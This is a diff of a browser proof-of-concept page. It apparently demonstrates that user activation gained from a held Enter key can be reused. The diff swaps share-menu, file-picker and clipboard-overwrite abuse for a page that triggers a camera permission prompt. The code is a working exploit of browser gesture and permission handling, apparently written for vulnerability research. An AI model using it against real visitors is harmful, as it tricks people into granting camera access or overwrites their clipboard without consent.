@@ -2,7 +2,7 @@
 <html>
 
 <head>
-    <title>PoC - Site B (Sensitive APIs)</title>
+    <title>PoC - Site B (Camera Prompt)</title>
     <style>
         body {
             font-family: monospace;
@@ -24,7 +24,6 @@
             margin-top: 20px;
             color: #666;
             text-align: center;
-            max-width: 80%;
         }
     </style>
 </head>
@@ -32,7 +31,7 @@
 <body>
 
     <div id="timer">2s...</div>
-    <div id="status">Tahan terus sampai 1s</div>
+    <div id="status">Tahan "Enter" sampai 1s</div>
 
     <script>
         setTimeout(() => { document.getElementById('timer').innerText = "1s..."; }, 1000);
@@ -41,31 +40,17 @@
         window.addEventListener('keyup', async (e) => {
             if (e.key === 'Enter') {
                 const status = document.getElementById('status');
+
                 if (navigator.userActivation.isActive) {
-                    let results = [];
                     try {
-                        if (navigator.share) {
-                            await navigator.share({ title: 'Ghost Gesture', text: 'PoC Leak', url: window.location.href });
-                            results.push("✅ Share Menu Opened");
-                        }
-                    } catch (err) { console.log("Share failed", err); }
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        stream.getTracks().forEach(track => track.stop());
 
-                    try {
-                        if (window.showOpenFilePicker) {
-                            await window.showOpenFilePicker();
-                            results.push("✅ File Picker Opened");
-                        }
-                    } catch (err) { console.log("File Picker failed", err); }
-
-                    try {
-                        await navigator.clipboard.writeText("GHOST_GESTURE_LEAK");
-                        results.push("✅ Clipboard Hijacked");
-                    } catch (err) { }
-
-                    status.innerHTML = results.length > 0
-                        ? `<span style="color:black; font-weight:bold;">${results.join("<br>")}</span>`
-                        : "RESULT: FAILED (Blocked by Browser Policy)";
-
+                        status.innerHTML = "<b style='color:black;'>✅ SUCCESS: Camera Prompt Triggered & Permission Granted!</b>";
+                    } catch (err) {
+                        status.innerHTML = `<b style='color:red;'>RESULT: ${err.name}</b><br>${err.message}`;
+                        console.log("Trigger failed:", err);
+                    }
                 } else {
                     status.innerText = "RESULT: EXPIRED (User Activation was not preserved)";
                 }
